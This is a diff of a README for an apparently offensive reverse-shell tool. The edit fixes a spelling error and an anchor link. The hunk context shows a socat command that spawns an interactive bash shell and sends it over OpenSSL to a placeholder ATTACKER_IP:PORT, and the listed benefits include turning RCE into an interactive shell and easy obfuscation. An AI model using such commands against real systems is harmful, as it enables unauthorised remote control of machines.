@@ -21,9 +21,9 @@ socat exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP:PORT],v
 **Why ?**
 * transform RCE to interactive reverse shell with almost no prerequisite (only `curl`)
 * cross-platform *(windows support is OK but not yet interactive. It is recommended to use non-docker solution for it)*
-* tired of hitting ^C and loosing your shell?
+* tired of hitting ^C and losing your shell?
 * too lazy to copy/paste/learn socat command
-* target doesn't have `socat` and you don't want to do [this](#alternative)
+* target doesn't have `socat` and you don't want to do [this](#alternatives)
 * provide more advanced configuration to the tty (alias, etc)
 * easier to obfuscate
 
